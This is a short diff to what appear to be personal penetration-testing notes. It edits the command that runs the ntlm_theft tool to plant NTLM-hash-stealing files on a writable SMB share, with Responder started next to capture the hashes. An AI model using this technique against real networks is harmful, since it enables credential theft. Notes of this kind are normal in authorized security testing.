@@ -134,7 +134,7 @@
 ## Putting theif executable in SMB (If writable)
 1. NTLM-Theif https://github.com/Greenwolf/ntlm_theft
    ```
-    python3 ntlm theft.py -g all -s {ip} -f {foldername}
+    python3 ~/Downloads/WindowUsefulTools/ntlm_theft/ntlm theft.py -g all -s {ip} -f {foldername}
    ```
 2. cd to the folder 
 3. Start respond.py in another place
